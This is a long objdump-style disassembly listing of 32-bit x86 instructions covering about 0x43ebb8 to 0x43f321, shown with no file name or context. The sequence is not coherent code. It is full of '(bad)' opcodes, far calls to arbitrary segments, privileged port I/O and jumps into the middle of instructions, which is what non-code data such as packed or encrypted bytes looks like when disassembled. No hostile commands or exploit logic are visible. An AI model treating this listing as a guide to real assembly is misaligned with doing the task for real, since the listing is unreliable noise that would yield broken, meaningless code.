  43ebb8:	js     0x43ebc5
  43ebba:	repz push es
  43ebbc:	sar    BYTE PTR [ebp-0x1f4b9e8e],1
  43ebc2:	jle    0x43eb9b
  43ebc4:	mov    bl,0x80
  43ebc6:	or     al,0x6f
  43ebc8:	aaa    
  43ebc9:	adc    al,0x6
  43ebcb:	fild   WORD PTR [edi+0x9]
  43ebce:	inc    esi
  43ebcf:	xor    dh,BYTE PTR [esi]
  43ebd1:	push   ebx
  43ebd2:	sti    
  43ebd3:	lea    esi,[eax-0x710734ba]
  43ebd9:	adc    bl,BYTE PTR [edx+0x57]
  43ebdc:	and    BYTE PTR [eax],ah
  43ebde:	lahf   
  43ebdf:	sbb    BYTE PTR [esi-0x4df22375],bl
  43ebe5:	out    dx,eax
  43ebe6:	xor    bh,BYTE PTR [esp+eax*8+0x32]
  43ebea:	inc    edx
  43ebeb:	test   al,0xc9
  43ebed:	mov    bh,0x33
  43ebef:	mov    eax,ds:0x17e544d2
  43ebf4:	mov    ecx,cs
  43ebf6:	call   0x89b:0x453019e4
  43ebfd:	mov    bl,0x2d
  43ebff:	call   0x820d:0x819ae176
  43ec06:	or     bh,dh
  43ec08:	mov    ecx,0x1cef9e34
  43ec0d:	jp     0x43ec51
  43ec0f:	cmp    al,0x58
  43ec11:	mov    bl,BYTE PTR [edi+0x2d]
  43ec14:	fmul   st,st(7)
  43ec16:	pop    esi
  43ec17:	or     BYTE PTR [edx+0xaf58228],dh
  43ec1d:	fdiv   DWORD PTR [esi+ebx*1+0x5f]
  43ec21:	or     ebx,edx
  43ec23:	jbe    0x43eba5
  43ec25:	out    0x3e,eax
  43ec27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ec28:	inc    ebp
  43ec29:	cmc    
  43ec2a:	call   0xcbea:0x85ff22bc
  43ec31:	adc    ebx,esp
  43ec33:	pop    ebp
  43ec34:	ror    DWORD PTR [ebx],1
  43ec36:	and    ebp,DWORD PTR [ebx+esi*2+0x61bb2626]
  43ec3d:	or     eax,0x2dbcb974
  43ec42:	lahf   
  43ec43:	inc    ebp
  43ec44:	push   esi
  43ec45:	imul   esp,esp,0xffffffda
  43ec48:	aad    0x36
  43ec4a:	fldenv [esi+0x116f3e5a]
  43ec50:	das    
  43ec51:	sti    
  43ec52:	fidivr WORD PTR [ebx+0x41]
  43ec55:	pop    edi
  43ec56:	call   0x775b:0x39a4c06b
  43ec5d:	jge    0x43eccc
  43ec5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ec60:	push   es
  43ec61:	(bad)  
  43ec62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ec63:	dec    edx
  43ec64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ec65:	dec    ebp
  43ec66:	mov    dh,0xd9
  43ec68:	mov    cl,0x26
  43ec6a:	cmc    
  43ec6b:	lahf   
  43ec6c:	js     0x43ebfc
  43ec6e:	mov    edx,0x5be21c57
  43ec73:	lahf   
  43ec74:	loope  0x43ec4e
  43ec76:	sbb    ah,ah
  43ec78:	sbb    esp,DWORD PTR [ecx]
  43ec7a:	cwde   
  43ec7b:	(bad)  
  43ec7d:	iret   
  43ec7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ec7f:	inc    ebx
  43ec80:	dec    DWORD PTR [ebx-0x310aca9]
  43ec86:	aam    0xed
  43ec88:	fimul  DWORD PTR [eax]
  43ec8a:	xchg   ebx,eax
  43ec8b:	and    eax,0x2220aa86
  43ec90:	adc    eax,0x63438ca
  43ec95:	dec    ebx
  43ec96:	jns    0x43ec51
  43ec98:	mov    ds:0xc3cc7058,eax
  43ec9d:	jno    0x43ec28
  43ec9f:	js     0x43ec9d
  43eca1:	das    
  43eca2:	call   0xdf19:0xa1473744
  43eca9:	or     eax,DWORD PTR [edx+edx*2]
  43ecac:	ds pop ecx
  43ecae:	pushf  
  43ecaf:	jl     0x43eca8
  43ecb1:	ja     0x43ec4e
  43ecb3:	pop    edi
  43ecb4:	fsubr  DWORD PTR [esi+ecx*4-0x7d]
  43ecb8:	xor    eax,esp
  43ecba:	bound  ebx,QWORD PTR [esi+ebx*4]
  43ecbd:	or     bh,BYTE PTR [ebx-0x1a]
  43ecc0:	adc    DWORD PTR [eax+ebx*8-0x4b10d292],ebx
  43ecc7:	loop   0x43ec7b
  43ecc9:	aaa    
  43ecca:	push   0xfffffffd
  43eccc:	imul   ebp,DWORD PTR [ebx+0x369fb3ce],0xffffffb3
  43ecd3:	dec    esi
  43ecd4:	mov    dl,0x44
  43ecd6:	pop    es
  43ecd7:	mov    al,ds:0xf13bc003
  43ecdc:	mov    dl,0x9
  43ecde:	pushf  
  43ecdf:	pop    ss
  43ece0:	in     al,dx
  43ece1:	test   BYTE PTR ds:0x230b1a48,ah
  43ece7:	mov    BYTE PTR [ebx-0x4751d406],0x1e
  43ecee:	call   0x49c5:0xdf9c862
  43ecf5:	xchg   ebp,eax
  43ecf6:	shl    DWORD PTR [edi+0x5af13f4a],cl
  43ecfc:	sub    BYTE PTR [ecx+0x71],bl
  43ecff:	fdiv   QWORD PTR [edx+0x6bb16478]
  43ed05:	jge    0x43ed62
  43ed07:	and    eax,0x27570b72
  43ed0c:	push   0xc24979be
  43ed11:	mov    dh,0x9a
  43ed13:	fwait
  43ed14:	or     DWORD PTR [edi-0x770a4df8],0x8d19a7cf
  43ed1e:	jmp    0x43ecf9
  43ed20:	sbb    al,0xf4
  43ed22:	aaa    
  43ed23:	lods   al,BYTE PTR ds:[esi]
  43ed24:	mov    dl,0x2e
  43ed26:	mov    WORD PTR ds:0xccfe30da,es
  43ed2c:	lock or dl,al
  43ed2f:	sub    esi,esp
  43ed31:	inc    edi
  43ed32:	inc    ebp
  43ed33:	das    
  43ed34:	pop    edx
  43ed35:	jbe    0x43edb5
  43ed37:	xor    DWORD PTR [edx+0x6e07f859],0xd
  43ed3e:	(bad)  
  43ed3f:	out    0x26,eax
  43ed41:	or     esp,DWORD PTR [ecx+0x1]
  43ed44:	call   0x42ed34c5
  43ed49:	data16 (bad) 
  43ed4b:	shl    BYTE PTR [edx-0x497af6bf],0xc3
  43ed52:	mov    ds:0x730bbfbc,eax
  43ed57:	dec    edi
  43ed58:	fld    QWORD PTR [ebp+0x1f9fc924]
  43ed5e:	call   0xc5c2:0x8b2c82d
  43ed65:	in     eax,dx
  43ed66:	pop    ebp
  43ed67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ed68:	or     eax,0x89991bab
  43ed6d:	xor    bl,BYTE PTR [ecx]
  43ed6f:	out    dx,al
  43ed70:	mov    dl,0xd4
  43ed72:	add    eax,0x216d94d5
  43ed77:	jno    0x43ed58
  43ed79:	xor    BYTE PTR [ebp+ebx*2+0x31],bh
  43ed7d:	inc    esp
  43ed7e:	imul   eax,edi,0x20
  43ed81:	stos   BYTE PTR es:[edi],al
  43ed82:	push   edx
  43ed83:	adc    DWORD PTR [edx+eax*4-0x71ebad66],esi
  43ed8a:	dec    ecx
  43ed8b:	pop    ss
  43ed8c:	dec    edi
  43ed8d:	jg     0x43ed43
  43ed8f:	sahf   
  43ed90:	enter  0x9a15,0x4c
  43ed94:	aas    
  43ed95:	sbb    eax,0x74879ac9
  43ed9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ed9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ed9c:	push   ds
  43ed9d:	mov    ebx,eax
  43ed9f:	mov    bl,0x42
  43eda1:	dec    esi
  43eda2:	or     eax,DWORD PTR [ebp-0x79d6fae0]
  43eda8:	add    esp,DWORD PTR [edx+ebx*4+0x3becf3bb]
  43edaf:	mov    dl,0xb2
  43edb1:	aam    0xb2
  43edb3:	jmp    0xb03b0f67
  43edb8:	mov    ecx,0x58a0600b
  43edbd:	repnz cli 
  43edbf:	push   esp
  43edc0:	test   ax,0xc99a
  43edc4:	mov    dl,BYTE PTR [edi+0x5decd8a1]
  43edca:	fldenv [edi+0x68d703ca]
  43edd0:	shl    BYTE PTR [edx],cl
  43edd2:	lods   al,BYTE PTR ds:[esi]
  43edd3:	push   esi
  43edd4:	mov    dl,0x79
  43edd6:	mov    edx,DWORD PTR [ebx]
  43edd8:	push   ecx
  43edd9:	xor    al,0xc
  43eddb:	and    al,0x8c
  43eddd:	jo     0x43ee30
  43eddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ede0:	mul    edx
  43ede2:	jecxz  0x43edef
  43ede4:	mov    cl,0x69
  43ede6:	jl     0x43eda5
  43ede8:	mov    dl,0x1b
  43edea:	out    0xf8,al
  43edec:	add    eax,0xf193525a
  43edf1:	or     ebp,DWORD PTR [esi]
  43edf3:	or     BYTE PTR [esi],0x64
  43edf6:	jmp    0x343b:0x9afaa48c
  43edfd:	and    al,0xa6
  43edff:	test   DWORD PTR [edi-0x26],ecx
  43ee02:	fwait
  43ee03:	mov    eax,0xe818eaf1
  43ee08:	ficomp DWORD PTR [edx+0x5a]
  43ee0b:	imul   esp,DWORD PTR [ebp+0x36],0xffffffb6
  43ee0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ee10:	mov    dh,BYTE PTR [edx-0x5ebd58d6]
  43ee16:	push   edi
  43ee17:	push   es
  43ee18:	out    0xd1,al
  43ee1a:	mov    ebx,0xde9851a9
  43ee1f:	cmp    al,0x72
  43ee21:	cmp    dh,ch
  43ee23:	mov    dh,0x5f
  43ee25:	inc    ebp
  43ee26:	call   0xde11:0x8225a628
  43ee2d:	xor    esi,DWORD PTR [ecx+0x68cefea7]
  43ee33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ee34:	xor    eax,0xb2e73d79
  43ee39:	fidiv  WORD PTR [ebx-0x32]
  43ee3c:	daa    
  43ee3d:	pop    eax
  43ee3e:	push   ebx
  43ee3f:	xor    al,0x43
  43ee41:	xchg   ebx,eax
  43ee42:	mov    ebp,0x420abca7
  43ee47:	jp     0x43ee43
  43ee49:	popf   
  43ee4a:	pushf  
  43ee4b:	pop    eax
  43ee4c:	mov    dl,0x7
  43ee4e:	outs   dx,BYTE PTR ds:[esi]
  43ee4f:	jo     0x43edeb
  43ee51:	mov    edi,0x174c35e6
  43ee56:	imul   esi,DWORD PTR [esi],0xffffffba
  43ee59:	retf   
  43ee5a:	ja     0x43ee2b
  43ee5c:	test   BYTE PTR [esp+edx*2-0x474b4d1e],0xd8
  43ee64:	sbb    al,0x4d
  43ee66:	push   cs
  43ee67:	fs in  eax,0x34
  43ee6a:	dec    edi
  43ee6b:	pop    edi
  43ee6c:	mov    dl,0x43
  43ee6e:	dec    esi
  43ee6f:	xchg   esp,eax
  43ee70:	je     0x43eef0
  43ee72:	jo     0x43ee4e
  43ee74:	mov    ch,0xba
  43ee76:	cmp    al,0xdb
  43ee78:	jg     0x43ee75
  43ee7a:	fidiv  DWORD PTR [esi+edx*8-0x6058d159]
  43ee81:	cmp    BYTE PTR [ebp+0x6b5f017c],0xad
  43ee88:	mov    dl,0x88
  43ee8a:	jg     0x43ee4b
  43ee8c:	cmp    al,0xb7
  43ee8e:	sub    al,0x98
  43ee90:	rcl    BYTE PTR [esi],cl
  43ee92:	fstp   QWORD PTR ds:0x381d372c
  43ee98:	popf   
  43ee99:	jb     0x43eef3
  43ee9b:	push   edi
  43ee9c:	mov    eax,0xa48da8a7
  43eea1:	push   cs
  43eea2:	xchg   esp,eax
  43eea3:	inc    eax
  43eea4:	mov    dl,0x16
  43eea6:	inc    edx
  43eea7:	dec    eax
  43eea8:	pop    ss
  43eea9:	lods   al,BYTE PTR ds:[esi]
  43eeaa:	xchg   edx,eax
  43eeab:	inc    ecx
  43eeac:	cmp    al,0x8
  43eeae:	stos   DWORD PTR es:[edi],eax
  43eeaf:	repz add BYTE PTR ds:0xee22a001,bl
  43eeb6:	stc    
  43eeb7:	or     DWORD PTR [edx],eax
  43eeb9:	and    BYTE PTR [edx+0x239acad2],bl
  43eebf:	push   0xa60ab0fc
  43eec4:	(bad)  
  43eec6:	outs   dx,DWORD PTR ds:[esi]
  43eec7:	cmc    
  43eec8:	cmp    ebp,DWORD PTR [edx-0x60878ca4]
  43eece:	call   0xa98:0x32d4228
  43eed5:	sub    BYTE PTR [edi],cl
  43eed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43eed8:	add    DWORD PTR [edi+eiz*1],esp
  43eedb:	sti    
  43eedc:	xchg   edx,eax
  43eedd:	dec    eax
  43eede:	jmp    0xc0bc:0x7bf4bddc
  43eee5:	sub    ecx,ebp
  43eee7:	addr16 out 0xa1,al
  43eeea:	and    BYTE PTR [ebp+edi*8+0x449cd8c2],0x31
  43eef2:	xor    bh,BYTE PTR [esi+0x2]
  43eef5:	mov    DWORD PTR [edx+0x62717352],esp
  43eefb:	sbb    dh,BYTE PTR [ebp+0x2602594f]
  43ef01:	or     DWORD PTR [edx-0x53c99580],ecx
  43ef07:	sahf   
  43ef08:	xchg   esp,eax
  43ef09:	outs   dx,DWORD PTR ds:[esi]
  43ef0a:	sbb    bl,ch
  43ef0c:	adc    esp,DWORD PTR [ecx]
  43ef0e:	add    BYTE PTR [ebx],cl
  43ef10:	push   edi
  43ef11:	lahf   
  43ef12:	call   0x8531:0x7c227929
  43ef19:	xchg   edi,eax
  43ef1a:	pop    edi
  43ef1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ef1c:	jmp    0x4d440bba
  43ef21:	cmp    DWORD PTR [edi+0x4252bd82],ebp
  43ef27:	jne    0x43eeec
  43ef29:	jge    0x43eec5
  43ef2b:	xor    DWORD PTR [edi-0x33],esi
  43ef2e:	adc    DWORD PTR [ecx+0x3e],ebp
  43ef31:	std    
  43ef32:	jae    0x43eedb
  43ef34:	sub    bh,BYTE PTR [edi]
  43ef36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ef37:	icebp  
  43ef38:	lods   eax,DWORD PTR ds:[esi]
  43ef39:	out    0x21,al
  43ef3b:	pop    ss
  43ef3c:	mov    dl,0xb5
  43ef3e:	cld    
  43ef3f:	push   ds
  43ef40:	dec    ebp
  43ef41:	sub    BYTE PTR [eax],cl
  43ef43:	out    dx,eax
  43ef44:	fiadd  WORD PTR [ebx+ecx*8]
  43ef47:	cmp    BYTE PTR [ebx],0xab
  43ef4a:	xchg   ebp,eax
  43ef4b:	stos   DWORD PTR es:[edi],eax
  43ef4c:	cdq    
  43ef4d:	in     al,0xe7
  43ef4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ef50:	pop    ebx
  43ef51:	push   esi
  43ef52:	ror    ch,0xcd
  43ef55:	push   ss
  43ef56:	xchg   BYTE PTR [edi-0x4988b512],dh
  43ef5c:	ret    0xdc4f
  43ef5f:	inc    ebx
  43ef60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ef61:	jne    0x43ef2d
  43ef63:	shr    DWORD PTR [ebx+ecx*4],1
  43ef66:	call   0x5bc3:0x50d81aea
  43ef6d:	cmp    ah,BYTE PTR [edx]
  43ef6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ef70:	and    bh,BYTE PTR [ecx+0x3b0f2336]
  43ef76:	pop    ds
  43ef77:	hlt    
  43ef78:	mov    dl,0x52
  43ef7a:	imul   edx,DWORD PTR [ebx-0x7],0x1e
  43ef7e:	clc    
  43ef7f:	outs   dx,DWORD PTR ds:[esi]
  43ef80:	xor    eax,0xcfb6e405
  43ef85:	adc    ebx,edx
  43ef87:	in     eax,0x21
  43ef89:	sbb    al,0xad
  43ef8b:	or     dh,BYTE PTR [edx+0x5f3bd528]
  43ef91:	(bad)  
  43ef92:	icebp  
  43ef93:	imul   edi,edi,0xb
  43ef96:	outs   dx,BYTE PTR ds:[esi]
  43ef97:	jge    0x43ef95
  43ef99:	push   esi
  43ef9a:	stos   BYTE PTR es:[edi],al
  43ef9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ef9c:	jbe    0x43ef38
  43ef9e:	call   0x6c38:0x866e978b
  43efa5:	dec    eax
  43efa6:	out    0xff,eax
  43efa8:	dec    edi
  43efaa:	call   0xc1de:0xe3fccd
  43efb1:	call   0x5a1d:0x10dca99a
  43efb8:	and    al,0x9
  43efba:	imul   esp,DWORD PTR [edi+0x489035d],0xbeb2750
  43efc4:	(bad)  
  43efc5:	aad    0xe0
  43efc7:	icebp  
  43efc8:	mov    ebp,0x71244fc9
  43efcd:	jmp    0x43efcd
  43efcf:	(bad)  
  43efd0:	daa    
  43efd1:	push   esp
  43efd2:	jne    0x43ef78
  43efd4:	sub    al,0xe2
  43efd6:	rol    BYTE PTR [ecx+0x59],0xb0
  43efda:	and    bh,BYTE PTR [ebp+0x469a0210]
  43efe0:	into   
  43efe1:	xor    al,0x5d
  43efe3:	xor    al,0x5c
  43efe5:	dec    ecx
  43efe6:	jmp    0x26f6:0xc40aa3a7
  43efed:	dec    ebp
  43efee:	mov    dl,0x31
  43eff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43eff1:	pop    ds
  43eff2:	imul   esi,DWORD PTR [edx+0x79e5d0b2],0xfffffffb
  43eff9:	retf   0xa717
  43effc:	call   0xa51f5f8d
  43f001:	out    dx,al
  43f002:	jmp    0x62d3dd08
  43f007:	call   0x4d936cbe
  43f00c:	jns    0x43f088
  43f00e:	(bad)  
  43f00f:	je     0x43efc3
  43f011:	push   ebx
  43f012:	mov    edi,0x4c722a4b
  43f017:	xchg   DWORD PTR [edx],esp
  43f019:	or     BYTE PTR [esi+edi*8],bl
  43f01c:	push   ebp
  43f01d:	loop   0x43efe9
  43f01f:	ja     0x43f06b
  43f021:	enter  0xd94e,0xac
  43f025:	xor    ebp,0xbe04728d
  43f02b:	add    DWORD PTR [eax-0x48],edi
  43f02e:	loopne 0x43efd0
  43f030:	test   eax,0x8bcaf23d
  43f035:	retf   
  43f036:	push   es
  43f037:	xchg   BYTE PTR [esi+0x317f9ada],bh
  43f03d:	pop    edi
  43f03e:	sbb    DWORD PTR [ebx+0x39],0xf
  43f042:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f044:	mov    WORD PTR [ebx-0x4121c35b],?
  43f04a:	sub    al,0xef
  43f04c:	mov    bl,0x49
  43f04e:	arpl   WORD PTR [ecx+0x36bd6a4a],ax
  43f054:	jb     0x43f010
  43f056:	test   BYTE PTR [edi+0x38476163],ah
  43f05c:	xor    BYTE PTR [esi-0x72],bl
  43f05f:	and    BYTE PTR [edx+0x3d2d5bbb],dh
  43f065:	ret    0x3fa3
  43f068:	sbb    cl,BYTE PTR [eax]
  43f06a:	pop    ss
  43f06b:	inc    ebp
  43f06c:	mov    ds:0x124be68b,eax
  43f071:	and    esp,edi
  43f073:	mov    al,0xbc
  43f075:	sub    dl,bl
  43f077:	loopne 0x43f0a8
  43f079:	sub    edi,DWORD PTR [ebx+eiz*8]
  43f07c:	jbe    0x43f0e1
  43f07e:	pusha  
  43f07f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f080:	jp     0x43f024
  43f082:	iret   
  43f083:	jnp    0x43f049
  43f085:	mov    ah,0x39
  43f087:	or     al,0xb2
  43f089:	sar    ah,1
  43f08b:	push   edi
  43f08c:	imul   edx,DWORD PTR [ebx],0xffffffe0
  43f08f:	jae    0x43f10a
  43f091:	or     bh,bl
  43f093:	cld    
  43f094:	cmp    DWORD PTR [ebx],ebp
  43f096:	rcl    bl,1
  43f098:	push   es
  43f099:	sub    edi,DWORD PTR [ecx+0x5c]
  43f09c:	mov    dl,0x99
  43f09e:	inc    ebx
  43f09f:	pop    ecx
  43f0a0:	sub    BYTE PTR [edi+0xc9877bc],cl
  43f0a6:	neg    ch
  43f0a8:	sti    
  43f0a9:	push   esi
  43f0aa:	mov    bl,0xa7
  43f0ac:	mov    ebx,edx
  43f0ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f0af:	or     dh,BYTE PTR [eax+0x58a310f9]
  43f0b5:	out    dx,al
  43f0b6:	push   ds
  43f0b7:	addr16 dec esp
  43f0b9:	sar    BYTE PTR [ecx-0x36ac6759],cl
  43f0bf:	ins    DWORD PTR es:[edi],dx
  43f0c0:	pushf  
  43f0c1:	inc    esp
  43f0c2:	ror    BYTE PTR [edx+esi*4+0x8],1
  43f0c6:	test   DWORD PTR [ebp-0x5ae30675],eax
  43f0cc:	sub    BYTE PTR [edx],al
  43f0ce:	sbb    ah,ch
  43f0d0:	stos   BYTE PTR es:[edi],al
  43f0d1:	or     al,0x1a
  43f0d3:	sbb    DWORD PTR [eax],edi
  43f0d5:	jle    0x43f0c9
  43f0d7:	div    DWORD PTR [edx-0x2a0498f2]
  43f0dd:	adc    bl,BYTE PTR [edx+0x6f]
  43f0e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f0e1:	or     eax,esp
  43f0e3:	and    ebx,eax
  43f0e5:	jge    0x43f098
  43f0e7:	(bad)  
  43f0e8:	aas    
  43f0e9:	jne    0x43f085
  43f0eb:	xor    BYTE PTR [edi+eiz*2],dl
  43f0ee:	test   DWORD PTR [ebx-0x58ba6e82],ebp
  43f0f4:	inc    ecx
  43f0f5:	fst    QWORD PTR [eax]
  43f0f7:	test   bl,dl
  43f0f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f0fa:	and    al,0x6d
  43f0fc:	int3   
  43f0fd:	stos   BYTE PTR es:[edi],al
  43f0fe:	call   0x8816:0xdd836fdb
  43f105:	cmp    DWORD PTR [ecx-0x59],edx
  43f108:	sub    eax,0x19422120
  43f10d:	pop    ecx
  43f10e:	add    BYTE PTR [esi-0x5b],0xf9
  43f112:	retf   
  43f113:	adc    eax,0x790867b1
  43f118:	dec    eax
  43f119:	repnz mov ds:0x70684657,al
  43f11f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f120:	jae    0x43f19e
  43f122:	les    ebx,FWORD PTR [ecx]
  43f124:	mov    esp,0xbc5add93
  43f129:	stos   BYTE PTR es:[edi],al
  43f12a:	xor    al,0xde
  43f12c:	sub    BYTE PTR [ebx],0x3f
  43f12f:	out    dx,al
  43f130:	dec    ecx
  43f131:	mov    bl,0x42
  43f133:	aaa    
  43f134:	mov    ecx,0x59c1c80b
  43f139:	adc    eax,0xc2035200
  43f13e:	call   0xc18c:0x1bec4c9
  43f145:	sbb    esi,ecx
  43f147:	cld    
  43f148:	fsubr  DWORD PTR [edx+0x745273f5]
  43f14e:	in     eax,0x6f
  43f150:	xchg   esp,eax
  43f151:	or     BYTE PTR [esp+eiz*8-0x49],ah
  43f155:	retf   
  43f156:	sahf   
  43f157:	int3   
  43f158:	dec    edx
  43f159:	pop    ebx
  43f15a:	xchg   al,ah
  43f15c:	pusha  
  43f15d:	int3   
  43f15e:	aaa    
  43f15f:	mov    bh,0x63
  43f161:	sti    
  43f162:	add    dh,BYTE PTR [edx]
  43f164:	into   
  43f165:	xchg   edi,eax
  43f166:	data16 scas al,BYTE PTR es:[edi]
  43f168:	mov    dl,0xfc
  43f16a:	out    0xa9,eax
  43f16c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f16d:	adc    BYTE PTR [eax],ch
  43f16f:	(bad)  
  43f170:	ror    DWORD PTR [ebx],1
  43f172:	and    DWORD PTR [edx-0x33],edx
  43f175:	inc    esp
  43f176:	sub    al,0x3b
  43f178:	leave  
  43f179:	cmp    al,0x9a
  43f17b:	jcxz   0x43f199
  43f17e:	cwde   
  43f17f:	jl     0x43f1a3
  43f181:	aas    
  43f182:	mov    edx,0x1707a4a7
  43f187:	test   DWORD PTR [esi-0x4eeda8e2],esp
  43f18d:	bound  ecx,QWORD PTR [ecx]
  43f18f:	mov    ebp,0x474914cd
  43f194:	dec    eax
  43f195:	pusha  
  43f196:	cmp    ah,BYTE PTR [edi+0x1162b94f]
  43f19c:	ja     0x43f1e6
  43f19e:	fwait
  43f19f:	or     al,0xb5
  43f1a1:	mov    eax,0x17ac248
  43f1a6:	cmp    dl,BYTE PTR [ecx+0x4b]
  43f1a9:	lds    eax,FWORD PTR [ecx]
  43f1ab:	mov    ebx,0x670913c2
  43f1b0:	outs   dx,DWORD PTR ds:[esi]
  43f1b1:	dec    ebp
  43f1b2:	(bad)  
  43f1b3:	push   eax
  43f1b4:	pop    eax
  43f1b5:	or     edx,ecx
  43f1b7:	xchg   ebx,eax
  43f1b8:	arpl   WORD PTR [eax-0x66],bx
  43f1bb:	or     BYTE PTR [eax+eiz*1],dh
  43f1be:	mov    al,0x3b
  43f1c0:	call   0xb883:0xeca7975f
  43f1c7:	pop    ss
  43f1c8:	pop    ebp
  43f1c9:	ret    
  43f1ca:	packsswb mm0,QWORD PTR [esi+0x50]
  43f1ce:	call   0x4870:0x24ceebcf
  43f1d5:	mov    bl,0x2d
  43f1d7:	aam    0xb8
  43f1d9:	or     ecx,DWORD PTR [ecx]
  43f1db:	jae    0x43f233
  43f1dd:	call   0xa0d88dae
  43f1e2:	call   0xa1d0:0x3194433
  43f1e9:	sar    BYTE PTR [ebx-0x6df47de1],cl
  43f1ef:	mov    al,0xf5
  43f1f1:	cmp    al,0x21
  43f1f3:	mov    ecx,cs
  43f1f5:	pop    edx
  43f1f6:	xchg   ecx,eax
  43f1f7:	mov    eax,0xd7cf084d
  43f1fc:	add    BYTE PTR ds:0xb01eec5,ah
  43f202:	mov    eax,ds:0x753ae178
  43f207:	jg     0x43f193
  43f209:	pop    ebx
  43f20a:	pop    es
  43f20b:	fnstenv [edx+0x15dd4333]
  43f211:	test   DWORD PTR [edi+0x7178b90b],esp
  43f217:	mov    bl,0xa4
  43f219:	xchg   DWORD PTR [eax-0x3d634dd9],ecx
  43f21f:	and    BYTE PTR ds:0xc04e8707,cl
  43f225:	pop    ecx
  43f226:	nop
  43f227:	ficomp DWORD PTR [ecx-0x4d8f733e]
  43f22d:	cmp    eax,0xc68f77e
  43f232:	retf   
  43f233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f234:	and    al,0x8f
  43f236:	sbb    al,0x61
  43f238:	fst    QWORD PTR [eax+ecx*2]
  43f23b:	imul   edx,DWORD PTR [eax+esi*8],0xffffff9a
  43f23f:	adc    esp,DWORD PTR [ecx-0x75]
  43f242:	or     ch,BYTE PTR [eax]
  43f244:	jg     0x43f24e
  43f246:	std    
  43f247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f248:	in     eax,dx
  43f249:	push   0xbbe932c7
  43f24e:	push   ebx
  43f24f:	ins    DWORD PTR es:[edi],dx
  43f250:	mov    dl,0xb2
  43f252:	jle    0x43f283
  43f254:	gs gs pop ebp
  43f257:	xchg   edi,eax
  43f258:	jmp    0xbb0b:0x87404725
  43f25f:	jno    0x43f243
  43f261:	lods   al,BYTE PTR ds:[esi]
  43f262:	fidivr WORD PTR [ebx-0x1b899b4e]
  43f268:	dec    ebx
  43f269:	xlat   BYTE PTR ds:[ebx]
  43f26a:	retf   
  43f26b:	js     0x43f237
  43f26d:	or     esp,ebx
  43f26f:	stos   BYTE PTR es:[edi],al
  43f270:	xchg   esp,eax
  43f271:	bound  ebp,QWORD PTR [edi-0x6509e71b]
  43f277:	sar    BYTE PTR [eax+0x6a],1
  43f27a:	fnstenv [ebx]
  43f27c:	dec    edx
  43f27d:	repnz enter 0xe9a7,0x9b
  43f282:	pop    ebx
  43f283:	cmp    edx,DWORD PTR [edi+0x4c]
  43f286:	lock int3 
  43f288:	mov    dl,0xad
  43f28a:	mov    ebx,0xe6996f4e
  43f28f:	adc    DWORD PTR [edx+0xb],0x7e
  43f293:	loop   0x43f28f
  43f295:	les    edx,FWORD PTR [esi-0x7b36404f]
  43f29b:	loope  0x43f274
  43f29d:	xchg   esi,eax
  43f29e:	call   0x15c:0x53a5c080
  43f2a5:	or     ecx,DWORD PTR [ecx-0x68]
  43f2a8:	mov    ds:0x4a9f741a,al
  43f2ad:	inc    ebp
  43f2ae:	call   0xc955:0xc6e48b34
  43f2b5:	call   0x4ba4:0x6bd9a7ba
  43f2bc:	or     al,0x4e
  43f2be:	in     al,0x13
  43f2c0:	mov    ecx,0x71e148c6
  43f2c5:	ficom  WORD PTR [eax+esi*4]
  43f2c8:	shl    BYTE PTR [eax],cl
  43f2ca:	inc    ebx
  43f2cb:	icebp  
  43f2cc:	loopne 0x43f283
  43f2ce:	call   0x95ef:0xe7d39174
  43f2d5:	clc    
  43f2d6:	popa   
  43f2d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f2d8:	push   ebp
  43f2d9:	and    cl,cl
  43f2db:	mov    dl,0xa6
  43f2dd:	or     eax,0x238be0fb
  43f2e2:	inc    ecx
  43f2e3:	fnstenv [edx-0x26fa0172]
  43f2e9:	mov    ebp,0x7bc90315
  43f2ee:	stc    
  43f2ef:	inc    ebx
  43f2f0:	mov    eax,ds:0xc1bb640b
  43f2f5:	adc    al,0x66
  43f2f7:	shl    DWORD PTR [ebp-0x100465f9],1
  43f2fd:	cmp    al,al
  43f2ff:	mov    al,ds:0xa77c2596
  43f304:	fstp   DWORD PTR [esi+0x5b]
  43f307:	and    DWORD PTR [ebp-0x4d3b374b],edx
  43f30d:	xor    BYTE PTR [eax],dl
  43f30f:	mov    ebx,0x10b9fafa
  43f314:	iret   
  43f315:	inc    edi
  43f316:	scas   al,BYTE PTR es:[edi]
  43f317:	mov    bl,0xaa
  43f319:	stos   DWORD PTR es:[edi],eax
  43f31a:	aam    0xd1
  43f31c:	adc    al,0xb0
  43f31e:	lahf   
  43f31f:	retf   
  43f320:	(bad)  
  43f321:	adc    al,0xc3
